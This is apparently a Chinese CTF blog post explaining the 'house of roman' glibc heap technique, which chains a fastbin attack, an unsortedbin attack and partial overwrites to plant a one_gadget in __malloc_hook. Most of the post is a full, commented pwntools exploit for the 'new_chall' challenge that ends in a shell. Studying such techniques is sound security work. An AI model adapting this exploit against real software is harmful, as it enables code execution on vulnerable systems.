---
layout: post
title: house of roman：fastbin attack + unsortedbin attack组合拳
category: Heap
date: 2023-9-23 21:04:32
---
Heap基础知识
<!-- more -->
[toc]
# house of roman

这种攻击方式可以在完全没有`leak`的情况下，多次利用与`unsortedbin`相连的`chunk`的`fd`和`bk`指向`main_arena+88`，或者`unsortedbin attack`来得到`main_arena+88`，然后根据这个`main_arena+88`来覆盖低位，通过一种`partial overwrite`的方式来进行攻击。个人认为`house of roman`并不是像其他`house of xxx`系列一样有明确的攻击利用链，师傅们只需要能够理解利用其中多次利用`unsortedbin`的`main_arena+88`的`partial write`即可。此外，还需要师傅们理解如何通过`fastbin attack`获取`unsortedbin`的`main_arena+88`：利用单字节溢出修改`unsortedbin chunk`的`size`，然后打`fastbin attack`。

但是这种攻击方式在`ASLR`开启时需要用到爆破，概率比较低为`1/4096`，因此师傅们理解这种攻击方式的思想即可。

作者提供了`github`[链接](https://github.com/romanking98/House-Of-Roman)，其中`new_chall`题目的详细注释的`exp`如下：

```python
from pwn import *
from LibcSearcher import *

filename = './new_chall'
context(log_level='debug')
local = 1
elf = ELF(filename)
# libc = ELF('')

if local:
    sh = process(filename)
else:
    sh = remote('node4.buuoj.cn', )

def debug():
    pid = util.proc.pidof(sh)[0]
    gdb.attach(pid)
    pause()

choice_words = '3. Free\n'

menu_add = 1
add_index_words = 'index :'
add_size_words = 'size of chunk :'
add_content_words = ''

menu_del = 3
del_index_words = 'Enter index :'

menu_edit = 2
edit_index_words = 'index of chunk :'
edit_size_words = ''
edit_content_words = 'data :'

def add(index=-1, size=-1, content=''):
    sh.sendlineafter(choice_words, str(menu_add))
    if add_size_words:
        sh.sendlineafter(add_size_words, str(size))
    if add_index_words:
        sh.sendlineafter(add_index_words, str(index))
    if add_content_words:
        sh.sendafter(add_content_words, content)

def delete(index=-1):
    sh.sendlineafter(choice_words, str(menu_del))
    if del_index_words:
        sh.sendlineafter(del_index_words, str(index))

def edit(index=-1, size=-1, content=''):
    sh.sendlineafter(choice_words, str(menu_edit))
    if edit_index_words:
        sh.sendlineafter(edit_index_words, str(index))
    if edit_size_words:
        sh.sendlineafter(edit_size_words, str(size))
    if edit_content_words:
        sh.sendafter(edit_content_words, content)

def leak_info(name, addr):
    success('{} => {}'.format(name, hex(addr)))

# 我需要在malloc_hook中写one_gadget
# 思路是通过fastbin attack来申请到one_gadget
sh.recv()
sh.sendline('good name')
add(index=0, size=0x18) # size 0x20
add(index=1, size=0xc8) # size 0xd0
add(index=2, size=0x60) # size 0x70

payload = b'a'*0x68 + p64(0x61)
edit(index=1, content=payload)

# free再申请回来，由此在chunk内写下main_arena+88
delete(index=1)
add(index=1, size=0xc8)

# 存在单字节溢出，通过chunk0来修改chunk1的size
edit(index=0, content=b'a'*0x18 + p8(0x71))

# 申请几个大小为0x70的chunk，目的是通过fastbin的fd指针中的堆地址来获得含有main_arena+88地址的那个fake fastbin chunk
add(index=3, size=0x60) # size 0x70
add(index=4, size=0x60) # size 0x70
delete(index=2)
delete(index=3) # fastbin: 3->2
# fastbin: chunk3 -> chunk2
# 其中chunk3的fd指针在我本次调试为0x5555556050f0，且含有main_arena+88地址的那个fake chunk的地址为0x555555605020
# 因此只修改最后一位为0x20，使其fastbin指向最后一位
edit(index=3, content=p8(0x20))

# 修改后，fastbin为chunk3 -> fake_chunk -> main_arena + 88
# 我们知道main_arena + 88和malloc_hook是很接近的，实际上是main_arena比__malloc_hook只要大0x68
# 我们又可以通过修改fake_chunk的最后两字节来获得一个包含__malloc_hook的chunk
# 在__malloc_hook之前的0x23字节处有一个0x7f，因此可以通过这个来构造
# 那么有一个明显的问题：ASLR开启时，最低位只有3位是固定的。而我们需要覆盖4位，因此这里相当于会进行一个爆破，成功概率为1/16
# 在我调试的时候，main_arena+88为0x7ffff7dd1b78，而0x7f的包含malloc_hook的fake_chunk为0x7ffff7dd1aed，因此我会覆盖最低两字节为0x1aed
edit(index=1, content=p16(0x1aed))
add(index=5, size=0x60)
add(index=6, size=0x60)
add(index=7, size=0x60) # 这里将会申请到malloc_hook，但是其值为0

# 那么接下来，我们打unsortedbin attack，往malloc_hook里面写main_arena+88
add(index=8, size=0x100)
add(index=9, size=0x100) # 防止合并
delete(index=8) # 此时bk应该是main_arena+88，而在我调试的时候malloc_hook地址为0x7ffff7dd1b10，那么覆盖最低位为0x00（malloc_hook-0x10）即可
edit(index=8, content=p64(0) + p8(0x0))
add(index=10, size=0x100) # 发起unsortedbin attack，会往malloc_hook里面写main_arena+88

# 这里到了最后一步：写malloc_hook里面的main_arena+88的最后三字节为one_gadget。
# 我通过0x45216可以计算出libc_base + 0x45216 = 0x7ffff7a52216，而main_arena+88为0x7ffff7dd1b78，因此写最后三位即可
# 开启ASLR的情况下，0x7ffff7a52216中的那个a不一定为a，这里的成功率也只有1/16，与前面的爆破加起来，概率只有1/4096了。
# one_gadget = [0x45216, 0x4526a, 0xf02a4, 0xf1147]

edit(index=7, content=b'a'*0x13 + b'\xa4\xd2\xaf')

# 完事之后，我们需要触发malloc_hook，简单的方式就是触发malloc_printerr，我们进行一个double free即可
# 我这里尝试了直接malloc，结果反而是无法得到shell，原因还真不太清楚
# add(index=11, size=0x50)
delete(index=5)
delete(index=5)
# debug()
sh.interactive()
```

# 